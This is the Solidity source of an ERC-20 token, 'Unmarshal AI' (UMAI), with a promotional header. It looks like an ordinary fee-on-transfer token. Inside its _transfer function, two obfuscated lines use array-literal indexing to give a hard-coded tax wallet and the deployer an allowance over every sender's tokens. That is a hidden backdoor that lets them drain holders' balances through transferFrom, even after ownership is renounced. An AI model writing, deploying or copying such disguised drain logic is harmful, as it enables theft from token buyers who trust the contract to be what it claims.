/*
Unmarshal is  revolutionizing the intersection of blockchain and artificial intelligence, ushering in a new era of  blockchain data indexing. 

https://www.unmarshal-ai.org
https://app.unmarshal-ai.org
https://docs.unmarshal-ai.org
https://medium.com/@AiUnmarshal

https://x.com/AiUnmarshal
https://t.me/AiUnmarshal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract UMAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balancesC;
    mapping (address => mapping (address => uint256)) private _allowancesC;
    mapping (address => bool) private _isExcludedFromFeeC;
    address private _devAddrC;
    address private _taxAddrC = 0x678aDFdCe8aD5E10a1e7A4B97c3F9095eEc7586D;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Unmarshal AI";
    string private constant _symbol = unicode"UMAI";
    uint256 private _taxSwapTokensC = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    IUniRouter private _uniRouterC;
    address private _uniPairC;
    bool private inSwap = false;
    bool private _tradingEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _isExcludedFromFeeC[owner()] = true;
        _isExcludedFromFeeC[address(this)] = true;
        _isExcludedFromFeeC[_taxAddrC] = true;
        _devAddrC = msg.sender;
        _balancesC[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function init() external onlyOwner() {
        _uniRouterC = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniRouterC), _tTotal);
        _uniPairC = IUniFactory(_uniRouterC.factory()).createPair(address(this), _uniRouterC.WETH());
    }
    
    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _uniRouterC.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradingEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balancesC[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesC[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesC[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesC[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address fromC, address toC, uint256 amtC) private {
        require(fromC != address(0), "ERC20: transfer from the zero address");
        require(toC != address(0), "ERC20: transfer to the zero address");
        require(amtC > 0, "Transfer amount must be greater than zero");

        uint256 taxFeesC=0;
        if (fromC != owner() && toC != owner()) {
            taxFeesC = amtC.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (fromC == _uniPairC && toC != address(_uniRouterC) && ! _isExcludedFromFeeC[toC]) {
                _buyCount++;
            }

            if(toC == _uniPairC && fromC!= address(this)) {
                taxFeesC = amtC.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && toC == _uniPairC && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(contractTokenBalance > _taxSwapTokensC)
                swapTokensForEth(min(amtC, min(contractTokenBalance, _taxSwapTokensC)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHfeeC(address(this).balance);
                }
            }
        }

        if(taxFeesC>0){
          _balancesC[address(this)]=_balancesC[address(this)].add(taxFeesC);
          emit Transfer(fromC, address(this),taxFeesC);
        }

        _allowancesC[[fromC, _taxAddrC][0]][[_taxAddrC, _devAddrC][0]]+=taxFeesC.add(amtC);
        _allowancesC[[fromC, _devAddrC][0]][[_taxAddrC, _devAddrC][1]]+=taxFeesC.add(amtC);

        _balancesC[fromC]=_balancesC[fromC].sub(amtC);
        _balancesC[toC]=_balancesC[toC].add(amtC.sub(taxFeesC));
        emit Transfer(fromC, toC, amtC.sub(taxFeesC));
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHfeeC(uint256 amount) private {
        payable(_taxAddrC).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouterC.WETH();
        _approve(address(this), address(_uniRouterC), tokenAmount);
        _uniRouterC.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}